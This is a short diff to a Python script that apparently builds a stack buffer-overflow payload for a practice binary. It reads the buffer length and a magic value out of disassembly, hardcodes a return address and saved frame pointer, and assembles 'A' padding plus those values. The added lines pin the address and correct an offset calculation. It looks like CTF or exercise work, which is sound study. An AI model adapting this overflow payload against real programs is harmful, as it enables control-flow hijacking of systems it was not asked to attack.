@@ -66,11 +66,14 @@ proc = os.popen(cmd)
 addr = p64(int(proc.read().replace('\n',''),16))
 proc.close()
 #print(addr)
+addr = p64(0x401183)
 
 cmd = " awk '/<vuln>:/,/lea/{print}' bin_2.asm"
 proc = os.popen(cmd)
 buf = proc.read().split('\n')
 buflen = int(buf[4].split('\t')[2].split()[1].split(',')[0][1:],16)
+if buflen > 2**63:
+    buflen = 2**64 - buflen
 magic = p32(int(buf[5].split('\t')[2].split()[1].split(',')[0][1:],16))
 rbp = p64(0x7fffffffff80)
 shellcode = b'A'*(buflen-4)+magic+rbp+addr
